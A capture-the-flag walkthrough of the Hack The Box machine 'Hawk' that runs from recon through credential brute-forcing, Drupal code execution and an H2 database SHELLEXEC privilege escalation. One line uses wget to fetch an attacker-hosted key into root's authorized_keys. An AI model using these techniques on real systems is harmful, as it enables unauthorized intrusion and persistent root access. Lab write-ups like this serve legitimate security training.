# Hawk Hack The Box Tips

# ${{\color{purple}Initial Recon}}\ $

``nmap -sC -sV -oA hawk -T4 10.10.10.102``

![image](https://user-images.githubusercontent.com/123066149/230886175-1c075cce-aa30-4eba-a72e-a49466a2dc7f.png)

``nmap -p- -sV -oA fullhawk -T4 10.10.10.102``

![image](https://user-images.githubusercontent.com/123066149/230886275-c19e7b0f-4fff-4941-b29f-9376edc03cdd.png)

# ${{\color{purple}Initial Foothold}}\ $

``ftp 10.10.10.102 21``

``dir -a``

``get <nom du fichier>``

![image](https://user-images.githubusercontent.com/123066149/230886704-2c55705f-ec28-4551-9d49-459be1057e3c.png)

``mv .drupal.txt.enc encrypted``

``file encrypted``

![image](https://user-images.githubusercontent.com/123066149/230886940-6b64d2ea-3e79-4f79-a011-c0c6159c9ea7.png)

``wc -c encrypted``

![image](https://user-images.githubusercontent.com/123066149/230887039-d7b5a775-37de-4b91-a12b-fffb0862640f.png)

### It's all the cipher available in openssl :

``openssl --help``

![image](https://user-images.githubusercontent.com/123066149/230887119-6e31e1fd-a610-4ab3-bb7f-8278c7ff5163.png)

``bruteforce-salted-openssl -t 10 -f /usr/share/wordlists/rockyou.txt -c aes-256-cbc -d sha256 encrypted``

![image](https://user-images.githubusercontent.com/123066149/230891237-c3fc28d2-a9f7-4077-8401-e7cb26b69c2c.png)

``openssl enc -aes-256-cbc -d -in encrypted -out decrypted -k friends``

![image](https://user-images.githubusercontent.com/123066149/230891407-a9d9ffcf-6119-49c1-baef-1956536bc8fb.png)

``cat decrypted``

![image](https://user-images.githubusercontent.com/123066149/230891465-0b517b98-6acf-47b9-b8f2-85f84c60b7aa.png)

# ${{\color{purple}Exploitation}}\ $

### Godd ressource for drupal hacking :

https://book.hacktricks.xyz/network-services-pentesting/pentesting-web/drupal

### I used thi creds on the drupal portal :

![image](https://user-images.githubusercontent.com/123066149/230891583-beac5b4c-3203-42ef-b232-b2deed1d890e.png)

### Active php modules :

![image](https://user-images.githubusercontent.com/123066149/230891707-bfb6790c-5163-4e54-88ca-40e4f42166fb.png)


![image](https://user-images.githubusercontent.com/123066149/230891898-c92282fb-f6e9-4fbb-8df5-535f6658c01e.png)

![image](https://user-images.githubusercontent.com/123066149/230892120-a8b817e8-4f08-4b91-92d2-cf0b123de873.png)

![image](https://user-images.githubusercontent.com/123066149/230892506-3658a936-878f-4cde-b4cd-97714c81a932.png)

![image](https://user-images.githubusercontent.com/123066149/230892536-2bcfd7cc-7e3d-442f-9a9c-c459acf7616c.png)

# ${{\color{purple}Privilege Escalation}}\ $

### I found a usable database password for a user in ssh

![image](https://user-images.githubusercontent.com/123066149/230892915-e78bcace-86fb-447e-9cdd-5f3af511fedf.png)

### We have a python shell :

![image](https://user-images.githubusercontent.com/123066149/230893148-5b5b3e46-0256-4b7d-a0ce-4a1e31bf8530.png)

### Spawn a shell :

``import pty``

``pty.spawn("/bin/bash")``

![image](https://user-images.githubusercontent.com/123066149/230893408-b80e3599-7ae9-4925-a663-58e4d1b85f1c.png)

### Was we can see this program have the root privilège :

![image](https://user-images.githubusercontent.com/123066149/230893535-91aeaf9e-6efa-4de8-90b8-99b9a961666b.png)
![image](https://user-images.githubusercontent.com/123066149/230893574-7197f782-c096-4c5b-b784-92a73bf6072c.png)

``netstat -antp``

![image](https://user-images.githubusercontent.com/123066149/230893739-d42f3312-9667-4a1c-be8d-3da498599adf.png)

### We can redirect this port in the local machine with ssh:

``ssh -L 127.0.0.1:4444:127.0.0.1:8082 daniel@10.10.10.102``

![image](https://user-images.githubusercontent.com/123066149/230893850-f5a6fe34-b5b6-4fe4-b3c3-a0a85038c7d1.png)

![image](https://user-images.githubusercontent.com/123066149/230893909-54756edb-3d7c-4892-80a3-805d545e3373.png)

### I connect to the database with the creds I found before :

![image](https://user-images.githubusercontent.com/123066149/230894137-51516348-5fe4-4308-b157-e95fb7c51444.png)

``searchsploit H2 database``

![image](https://user-images.githubusercontent.com/123066149/230894231-840b1713-2e28-4e28-b836-14b1c0b1f14a.png)

### Finding a blog post in the exploit :

![image](https://user-images.githubusercontent.com/123066149/230894288-487080f4-7e89-48f1-9208-0e11f68e6b62.png)

https://mthbernardes.github.io/rce/2018/03/14/abusing-h2-database-alias.html

![image](https://user-images.githubusercontent.com/123066149/230894349-a7c32be7-c966-42e0-b372-74f15ebac9e3.png)

![image](https://user-images.githubusercontent.com/123066149/230894599-6b06c4a7-398e-494e-8816-7d926a83c6ea.png)

### I actually had a surprisingly difficult time going from this code execution to a shell. I tried the standard reverse shells, but none seemed to work

``ssh-keygen``

![image](https://user-images.githubusercontent.com/123066149/230894932-5e96a022-d70c-4783-ad4b-60c96d940828.png)

``cat id_rsa.pub > authorized_keys``

``cat authorized_keys ``

![image](https://user-images.githubusercontent.com/123066149/230895081-f34a9267-78c6-419c-ba05-a5e2697d7a60.png)

``CALL SHELLEXEC('wget -O /root/.ssh/authorized_keys http://10.10.14.10:80/id_rsa.pub')``

![image](https://user-images.githubusercontent.com/123066149/230895262-2f8acb6c-de52-4770-a41c-d6b1d32034bb.png)

``python2.7 -m SimpleHTTPServer 80``

![image](https://user-images.githubusercontent.com/123066149/230895149-5327d4c4-9889-4b5f-a56e-56d9057956fd.png)

``chmod 600 id_rsa``

``ssh -i ssh/id_rsa root@10.10.10.102``

![image](https://user-images.githubusercontent.com/123066149/230895439-2bdf8fc0-c890-494c-b292-6788a882808e.png)

### Enter passphrase created during sshkeygen :

![image](https://user-images.githubusercontent.com/123066149/230895586-09fb2e0b-7f46-4eb0-9888-9e45f6bd8f08.png)


# ${{\color{purple}Points of Improvement}}\ $
